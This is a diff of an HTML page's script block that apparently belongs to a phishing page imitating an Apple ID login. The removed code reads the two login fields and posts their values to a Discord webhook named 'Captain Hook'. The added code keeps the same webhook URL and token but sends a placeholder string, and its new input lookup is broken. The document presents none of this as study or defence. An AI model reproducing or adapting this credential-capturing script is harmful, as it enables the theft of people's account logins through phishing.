@@ -12,36 +12,30 @@
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/js/bootstrap.bundle.min.js"
         integrity="sha384-ENjdO4Dr2bkBIFxQpeoTz1HIcje39Wm4jDKdf19U8gI4ddQ3GYNS7NTKfAdVQSZe"
         crossorigin="anonymous"></script>
-    <script>
+        <script>
+            var input = document.getElementsByClassName("AppleIDl").value;
+            function sendMessage() {
 
-        function sendMessage() {
-            let input1 = document.getElementsByClassName("AppleIDl")[0].value;
-            let input2 = document.getElementsByClassName("AppleIDl")[1].value;
-
-            if (input1 == "" || input2 == "") {
-                alert("Vyplň všechny pole");
-            }
-            else {
                 const request = new XMLHttpRequest();
                 request.open("POST", "https://discord.com/api/webhooks/1112686604373471296/KrBr2V0E_fG7v5KAC6AVr67kLL1tG9gRWWpQRZ7zM1Kv6aYDAdzwVBSRsr-l_5TS63Wx");
 
                 request.setRequestHeader('Content-type', 'application/json');
 
                 const params = {
-                    username: "Captain Hook",
-                    avatar_url: "",
-                    content: input1 + " " + input2
+                  username: "Captain Hook",
+                  avatar_url: "",
+                  content: "The message to send"
                 }
-
+          
                 request.send(JSON.stringify(params));
-            }
-        }
+              }
 
-
-
-
-
-    </script>
+            
+             
+  
+          
+  
+        </script>
 </head>
 
 <body>
